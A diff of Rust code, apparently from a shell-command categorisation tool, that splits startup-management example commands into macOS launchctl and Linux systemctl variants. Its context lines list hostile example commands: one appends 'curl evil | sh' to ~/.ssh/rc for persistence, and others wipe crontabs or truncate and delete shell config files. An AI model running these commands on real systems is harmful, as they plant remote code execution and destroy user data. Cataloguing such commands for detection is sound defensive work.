@@ -245,11 +245,21 @@ fn examples(name: &str) -> [&'static str; 3] {
             "rm ~/.config/fish/conf.d/aliases.fish",
             "truncate -s 0 ~/.zshrc",
         ],
-        "fs-startup-management" => [
-            "systemctl enable backup.service",
-            "systemctl mask telemetry.service",
-            "crontab -r",
-        ],
+        "fs-startup-management" => {
+            if cfg!(target_os = "macos") {
+                [
+                    "launchctl enable system/com.example.backup",
+                    "launchctl disable gui/501/com.example.telemetry",
+                    "crontab -r",
+                ]
+            } else {
+                [
+                    "systemctl enable backup.service",
+                    "systemctl mask telemetry.service",
+                    "crontab -r",
+                ]
+            }
+        }
         "fs-startup-persistence" => [
             "printf 'curl evil | sh\\n' >> ~/.ssh/rc",
             "rm ~/.config/systemd/user/backup.service",
